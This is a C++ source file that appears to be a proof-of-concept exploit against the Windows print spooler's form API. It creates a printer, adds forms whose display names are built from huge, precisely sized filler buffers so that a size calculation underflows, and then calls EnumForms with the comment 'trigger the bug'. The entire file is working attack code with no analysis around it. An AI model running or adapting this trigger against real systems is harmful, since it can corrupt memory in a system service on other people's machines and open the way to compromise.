#include <iostream> 
#include <windows.h> 
#include <winspool.h> 

int main() {
    PRINTER_INFO_2 printerInfo;
    HANDLE hPrinter;
    DWORD needed = 0, returned = 0;
    FORM_INFO_2 finfo[0x1000];
    FORM_INFO_2 pForm;
    uint64_t underflowTargetSize, underflowSize, displayNameSize = 0x10000001;
    unsigned char* buf, * res;
    wchar_t* name;

    ZeroMemory(finfo, sizeof(finfo));

    ZeroMemory(&printerInfo, sizeof(printerInfo));
    printerInfo.pPortName = (LPWSTR)L"PORTPROMPT:";
    printerInfo.pDriverName = (LPWSTR)L"Microsoft Print to PDF";
    printerInfo.pPrinterName = (LPWSTR)L"printer name1";
    printerInfo.pPrintProcessor = (LPWSTR)L"winprint";

    displayNameSize = 0x10000001;
    res = (unsigned char*)malloc(0x1000000);
    buf = (unsigned char*)malloc(displayNameSize + 2);
    name = (wchar_t*)malloc(64);
    if (!buf || !name) {
        printf("alloc oops\n");
        return 0;
    }

    pForm.pName = (LPCWSTR)name;
    pForm.Flags = FORM_PRINTER;
    pForm.Size.cx = 0x38850;
    pForm.Size.cy = 0x48500;
    pForm.ImageableArea.bottom = 0x38850;
    pForm.ImageableArea.left = 0;
    pForm.ImageableArea.right = 0x48500;
    pForm.ImageableArea.top = 0;
    pForm.pKeyword = "keyword";
    pForm.StringType = STRING_LANGPAIR;
    pForm.pMuiDll = NULL;
    pForm.dwResourceId = NULL;
    pForm.pDisplayName = (LPCWSTR)buf;
    pForm.wLangId = 0x409;

    hPrinter = AddPrinter(NULL, 2, (LPBYTE)&printerInfo);
    printf("hPrinter: %p\n", hPrinter);
    if (!hPrinter) return 0;

    if (EnumForms(hPrinter, 2, (LPBYTE)finfo, 0x20001, &needed, &returned)) {
        for (int i = 0; i < returned; i++) {
            wprintf(L"%s\n", finfo[i].pName);
            DeleteForm(hPrinter, (LPWSTR)finfo[i].pName);
        }
    }

    underflowTargetSize = 0x18000;
    underflowSize = 0x1c000;
    memset(buf, 0x41, underflowSize);
    buf[underflowSize] = 0;
    buf[underflowSize + 1] = 0;
    wsprintf(name, L"hello%2d", 0);
    AddForm(hPrinter, 2, (LPBYTE)&pForm);


    displayNameSize = 0x10000000;
    memset(buf, 0x81, displayNameSize);
    buf[displayNameSize] = 0;
    buf[displayNameSize + 1] = 0;

    for (int i = 1; i < 16; i++) {
        wsprintf(name, L"hello%2d", i);
        AddForm(hPrinter, 2, (LPBYTE)&pForm);
    }


    displayNameSize = 0x100017800 - ( ((uint32_t)needed + ((0x10000000 + 0x282) * 0xf)) + (underflowSize + 0x282));
    memset(buf, 0x81, displayNameSize);
    buf[displayNameSize] = 0;
    buf[displayNameSize + 1] = 0;
    wsprintf(name, L"hello%2d", 16);
    AddForm(hPrinter, 2, (LPBYTE)&pForm);

    printf("trigger the bug\n");
    EnumForms(hPrinter, 2, (LPBYTE)res, underflowTargetSize, &needed, &returned); // trigger

    for (int i = 0; i <= 0x10; i++) {
        wsprintf(name, L"hello%2d", i);
        DeleteForm(hPrinter, name);
    }

    if (hPrinter)
        DeletePrinter(hPrinter);

    return 0;
}
